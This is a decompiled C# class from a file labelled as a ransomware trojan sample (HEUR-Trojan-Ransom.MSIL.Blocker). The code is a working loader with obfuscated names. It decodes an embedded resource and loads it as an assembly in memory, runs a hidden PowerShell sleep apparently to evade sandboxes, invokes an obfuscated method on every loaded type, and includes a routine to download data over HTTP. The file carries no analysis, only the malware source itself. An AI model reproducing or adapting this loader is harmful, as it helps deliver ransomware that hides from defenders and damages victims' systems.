// Decompiled with JetBrains decompiler
// Type: sgr
// Assembly: Uqxxddmu, Version=101.0.1.8194, Culture=neutral, PublicKeyToken=null
// MVID: 7F7CC444-D85D-95D3-49E3-8012122C2DB0
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.06\HEUR-Trojan-Ransom.MSIL.Blocker.gen-f79a2b4e5394e8530c4b12ea66afcdebf51613601400a78961282102cec3f75d.exe

using Gxyizcn.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Threading;

internal class sgr
{
  private byte[] tfp()
  {
    byte[] aco = Resources.aco;
    aco.son();
    return aco;
  }

  private byte[] tfq(string lxr)
  {
    HttpWebRequest httpWebRequest = (HttpWebRequest) WebRequest.Create(lxr);
    MemoryStream lxr1 = new MemoryStream();
    using (HttpWebResponse response = (HttpWebResponse) httpWebRequest.GetResponse())
    {
      using (Stream responseStream = response.GetResponseStream())
      {
        byte[] numArray = new byte[10204];
        int lxt;
        do
        {
          lxt = responseStream.Read(numArray, 0, numArray.Length);
          this.tfr(ref lxr1, numArray, lxt);
        }
        while (lxt > 0);
        return lxr1.ToArray();
      }
    }
  }

  private void tfr(ref MemoryStream lxr, byte[] lxs, int lxt) => lxr.Write(lxs, 0, lxt);

  private Assembly tfs() => Thread.GetDomain().Load(this.tfp());

  internal string tft()
  {
    string empty = string.Empty;
    Process process = new Process();
    process.StartInfo.FileName = "powershell";
    process.StartInfo.Arguments = "Start-Sleep -Seconds 10;Start-Sleep -Seconds 10;";
    process.StartInfo.CreateNoWindow = true;
    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
    process.StartInfo.UseShellExecute = false;
    process.StartInfo.RedirectStandardOutput = true;
    process.Start();
    string end = process.StandardOutput.ReadToEnd();
    foreach (Type type in this.tfs().GetTypes())
    {
      try
      {
        end += (string) type.InvokeMember("Iaccclvyqewidn", BindingFlags.InvokeMethod, (Binder) null, (object) null, (object[]) null);
      }
      catch
      {
      }
    }
    return end;
  }
}
